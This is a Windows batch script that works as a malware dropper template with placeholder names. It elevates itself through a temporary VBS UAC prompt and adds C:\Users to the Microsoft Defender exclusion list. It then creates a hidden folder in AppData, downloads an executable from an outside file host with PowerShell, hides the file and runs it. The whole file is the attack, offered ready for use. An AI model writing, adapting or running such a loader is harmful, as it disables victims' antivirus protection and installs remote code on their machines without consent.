@echo off
::----------------------------------------------------------------------------------------------------------------::
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
::----------------------------------------------------------------------------------------------------------------::
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin 
)
::----------------------------------------------------------------------------------------------------------------::
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:", """, "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
::----------------------------------------------------------------------------------------------------------------::
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::----------------------------------------------------------------------------------------------------------------::
powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\Users'"
::----------------------------------------------------------------------------------------------------------------::
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "nameofyourfolder" 2>nul
attrib +h "nameofyourfolder" /s /d
cd "C:\Users\%USERNAME%\AppData\Local\nameofyourfolder"
::----------------------------------------------------------------------------------------------------------------::
Powershell -Command "Invoke-WebRequest 'https://envs.sh/nameofyourfile.exe' -OutFile 'nameofyourfile.exe'"
if exist "nameofyourfile.exe" (
    attrib +h "nameofyourfile.exe"
    start "" "nameofyourfile.exe"
    timeout /t 3 >nul
    if %errorlevel% NEQ 0 (
        echo Failed to start the executable
        exit /b 1
    )
) else (
    echo Failed to download the file
    exit /b 1
)
::----------------------------------------------------------------------------------------------------------------::
exit
